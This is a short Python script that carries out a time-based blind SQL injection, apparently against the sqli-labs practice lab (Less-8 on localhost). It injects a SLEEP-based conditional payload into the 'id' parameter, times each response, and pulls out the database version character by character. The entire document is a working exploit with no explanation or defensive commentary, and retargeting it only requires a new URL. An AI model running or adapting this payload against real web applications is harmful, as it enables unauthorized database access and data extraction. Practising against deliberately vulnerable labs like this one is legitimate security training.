import requests
import string
import time

url = "http://127.0.0.1/sqli-labs/Less-8/"
delay_threshold = 3

def payload(char, position):
    return f"?id=1'+AND+IF(SUBSTRING(version(),{position},1)='{char}',SLEEP(4),1)--+"

def send_request(char, position):
    full_url = url + payload(char, position)
    start = time.time()
    requests.get(full_url)
    end = time.time()    
    return (end - start) > delay_threshold

def extract_version():
    version = ""
    charset = string.digits + "." 
    for position in range(1, 20):
        found = False
        for char in charset:
            if send_request(char, position):
                version += char
                found = True
                break
        if not found:
            break
        
    print(f"Database version: {version}")
extract_version()